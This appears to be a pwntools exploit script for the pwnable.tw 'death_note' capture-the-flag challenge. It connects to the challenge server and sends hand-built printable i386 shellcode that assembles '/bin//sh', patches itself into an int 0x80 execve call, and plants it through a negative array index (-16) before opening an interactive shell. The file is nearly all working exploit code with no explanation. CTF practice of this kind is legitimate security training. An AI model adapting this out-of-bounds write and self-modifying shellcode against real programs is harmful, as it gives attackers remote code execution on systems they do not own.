from pwn import *

context.arch = 'i386'
PROG = './death_note'
exe = ELF(PROG)

### ------------------ EXPLOIT ------------------ ###

#r = process(PROG)
r = remote('chall.pwnable.tw', 10201)

def add(index, name):
    r.sendlineafter(b'choice :', b'1')
    r.sendlineafter(b'Index :', str(index).encode('utf-8'))
    r.sendlineafter(b'Name :', name)

def show(index):
    r.sendlineafter(b'choice :', b'2')
    r.sendlineafter(b'Index :', str(index).encode('utf-8'))

def delete(index):
    r.sendlineafter(b'choice :', b'3')
    r.sendlineafter(b'Index :', str(index).encode('utf-8'))

# create binsh string
pay = asm("""
push ecx
push 0x68732f2f
push 0x6e69622f
push esp
pop ebx
""")

# create int 0x80
pay += asm ("""
push edx
pop eax
push 0x7e
pop edx
sub byte ptr [eax+45], dl
sub byte ptr [eax+46], dl
push 0x22
pop edx
sub byte ptr [eax+46], dl

push ecx
pop eax

push ecx
pop edx
""")

pay += asm('inc eax') * 0xb
pay += b'\x4b\x20'

add(-16, pay)

r.interactive()

